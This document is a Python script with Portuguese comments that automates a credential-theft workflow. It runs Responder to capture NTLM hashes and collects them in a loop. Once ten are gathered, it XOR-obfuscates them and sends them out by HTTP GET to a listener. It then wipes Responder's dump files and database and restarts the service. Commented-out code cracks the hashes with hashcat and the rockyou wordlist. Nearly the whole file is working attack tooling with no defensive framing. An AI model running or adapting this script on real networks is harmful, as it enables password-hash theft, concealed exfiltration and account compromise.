import os
import subprocess
from datetime import datetime
import base64
import requests
import time

def xor_encrypt(base64_string, key):
    key_length = len(key)
    encrypted_bytes = []
    for i, byte in enumerate(base64_string):
        encrypted_byte = byte ^ key[i % key_length]  # Aplicando XOR byte a byte
        encrypted_bytes.append(encrypted_byte)
    return bytes(encrypted_bytes)


print("[+] Iniciando Responder")
os.system("sudo service responder start")
i=0
while True:
    # Verifica Hashes Coletados + Filtra lista
    output = subprocess.check_output("/usr/share/responder/DumpHash.py", shell=True)
    lista = str(output).split("\\n")
    lista_filtrada = [elemento for elemento in lista if "::" in elemento]

    # Verifica Quantidade de Hashes Coleta + Cria Arquivo .txt único de Backup
    nome_arquivo="hashes-"+datetime.now().strftime("%Y-%m-%d-%H-%M-%S")+".txt"
    print("[+] Quantidade de Hashes coletada:",len(lista_filtrada),"| Tempo:",i,"s")
    i+=10
    if len(lista_filtrada) >= 10:
        print("[+] Salvando hashes coletados no arquivo:",nome_arquivo)
        os.system("cp DumpNTLMv2.txt "+nome_arquivo)
        print("[+] Exfiltrando hashes via HTTP")
        lista_hashes=""
        # Lista -> Base64
        for hashes in lista_filtrada: lista_hashes+=hashes+","
        b = base64.b64encode(bytes(lista_hashes, 'utf-8')) # bytes
        # Base64 -> Cripto XOR
        # Chave hardcoded (por exemplo, uma lista de bytes)
        key = [0x1A, 0x2B, 0x3C, 0x4D, 0x5E]  # Substitua pelos seus valores de chave
        # Decodificar a string base64 para byte
        decoded_bytes = base64.b64decode(b)
        # Criptografar usando XOR
        encrypted_bytes = xor_encrypt(decoded_bytes, key)

        requests.get("http://127.0.0.1:3030/"+str(encrypted_bytes))
        print("[+] Limpando database Responder")
        os.system("echo '' > DumpNTLMv2.txt && echo '' > DumpNTLMv1.txt")
        os.system("rm /usr/share/responder/Responder.db")
        print("[+] Resetando Responder")
        os.system("sudo service responder restart")
        print("[+] Coletando novos Hashes...")
        i=0
    time.sleep(10)

        

    #sudo john --show hashes-2024-06-28-11-25-10.txt


    # https://medium.com/@ekiser_48014/python-penetration-testing-using-hashcat-and-python-to-crack-windows-passwords-34cb4f052bf3

    # Tool that simplifies the Hashcat cracking process.
    '''
    print("[+] Iniciando quebra de Hashes com hashcat + rockyou...")
    import subprocess

    # Prompt for type of hash
    hash_type = 5600

    # Prompt for location of hash file
    hash_file = "/usr/share/responder/"+nome_arquivo

    # Prompt for location to save findings
    output_file = "/usr/share/responder/cracked-"+nome_arquivo

    # Prompt for location of word list file
    word_list_file = "/usr/share/wordlists/rockyou.txt"

    # Define hashcat command with multithreading option
    hashcat_command = f"hashcat -m {hash_type} -a 0 {hash_file} {word_list_file} --potfile-disable --remove --outfile {output_file} 2>&-"

    # Execute hashcat command using subprocess
    try:
        print("[+] Hashcat Iniciado:",hashcat_command)
        output = subprocess.check_output(hashcat_command, shell=True)
    except Exception as e:
        print("[!] Hashcat finalizado:",e)'''


    #os.system("hashcat -a 0 -m 5600  /usr/share/responder/"+nome_arquivo+" /usr/share/wordlists/rockyou.txt --outfile-format=2 --outfile=out.txt")




